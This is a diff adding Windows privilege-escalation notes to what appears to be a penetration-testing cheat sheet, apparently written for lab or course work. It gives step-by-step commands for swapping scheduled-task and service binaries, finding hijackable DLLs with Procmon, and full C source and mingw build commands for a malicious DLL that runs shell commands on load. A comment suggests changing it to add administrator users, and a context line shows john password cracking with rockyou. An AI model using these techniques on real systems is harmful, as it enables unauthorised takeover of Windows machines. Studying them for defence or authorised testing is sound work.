@@ -374,17 +374,92 @@ sudo apt install john		# download john
 john --wordlist=rockyou.txt <fileWithHashs>		# how to start cracking, rockyou.txt is a wordlist
 
 
+###### Win Priv Esc
+# Schedule Tasks
+	# Binary Replacement
+	# DLL Hijacking
+# Services
+	# Binary Replacement
+	# DLL Hijacking
+	
+# Windows Access Control Model
+	# Access Tokens (users): Roles, Permissions, Rights
+	# Security Descriptors (Files):
+		# DACL - Discretionary Access Control List, rules on the file
+		# SACL - System Access Control List, auditing on the file
+		# ACES - Access Controls Entries, entries of what to audit on the file inside of the SACL
+
+## Scheduled Tasks Bin Replace
+Schedule Tasks	# check schld tasks app for tasks with these flags...
+	General Tab: Security Options = SYSTEM
+	Trigger Tab: Trigger = At Log On | Status = Enabled
+	Ations Tab: Action = Start a program		# replace .exe with a shell script if you have permission to do so
+shutdown /r /f /t 00		# restarts windows, may take several tries
+xfreerdp /u:thor /v:10.50.25.36 /dynamic-resolution +glyph-cache +clipboard		# log in as new user, use user in script, make sure ip is right too
+
+## Services Bin Replace
+Services		# check Services app for services with these flags...
+	Log On As: Local System
+	Start Type: Automatic
+	Decription: Blank (indicates third-party service)
+right click service -> view properties
+	Path to executable		# replace .exe with a shell script if you have permission to do so
+shutdown /r /f /t 00		# restarts windows, may take several tries
+xfreerdp /u:thor /v:10.50.25.36 /dynamic-resolution +glyph-cache +clipboard		# log in as new user, use user in script, make sure ip is right too
+
+## Scheduled Tasks DLL Hijacking
+# if unable to swap .exe but can still write to file...
+net use * \\live.sysinternals.com\tools		# maps sysinternal tools to next available drive
+Procmon.exe		# run procmon after moving to drive, may need to -accepteula
+	Filter
+		Process Name - contains - <process name> - include
+		Result - contains - NOT - include
+		Path - contains - .dll - include
+run the process		# and observe "NAME NOT FOUND" .dll's
+# Install Tools on Linux Machine and create malicious .dll 
+	sudo apt-get install mingw-w64 mingw-w64-common mingw-w64-tools mingw-w64-x86-64-dev -y
+	nano <vuln dll name>.c
+	
+### dll script ###
+#include <windows.h>4
+int execCommand()
+{
+ WinExec("cmd /C whoami > FINDME_1.txt", 1);		// redirects output to FINDME_1.txt and closes shell
+ // can be changed to create user & add to Desktop Users & Administrators -or- Add existing users to privileged groups 
+ return 0;
+}
+BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
+{
+ execCommand();
+ return 0;
+}
+### end of dll script ###
+# compile & make dll:
+	i686-w64-mingw32-g++ -c SSPICLI.c -o SSPICLI.o
+	i686-w64-mingw32-g++ -shared -o SSPICLI.dll SSPICLI.o -Wl,--out-implib,SSPICLI.a
 
 
 
+## DLL stuff
+C:\Windows C:\Windows\System32		# where most DLL's are located
+# DLL search order:
+	HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs ->
+	dir that App was run from -> dir in the C+ function GetSystemDirectory() -> dir in the C+ function GetWindowsDirectory() -> The current dir
+# Windows Integrity Mechanism:
+	Untrusted - Anonymous SID access tokens
+	Low - Everyone SID access token (World)
+	Medium - Authenticated Users
+	High - Administrators
+	System - System services (LocalSystem, LocalService, NetworkService)
 
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System		# check UAC settings, look at EnableLUA 1=on, 0=off
 
-
-
-
-
-
-
+# File Manifest
+	# Requested Execution Level: asInvoker, highestAvailable, asAdministrator
+	# AutoElevate: True or N/A		# elevates priv to run programs that require it
+net use * \\live.sysinternals.com\tools		# maps sysinternal tools to next available drive
+sigcheck.exe -m C:\Windows\System32\eventvwr.exe | findstr /i level		# finds ExecutionLevel of eventvwr
+sigcheck.exe -m C:\Windows\System32\eventvwr.exe | findstr /i autoelevate		#	finds autoElevate of eventvwr
 
 
 
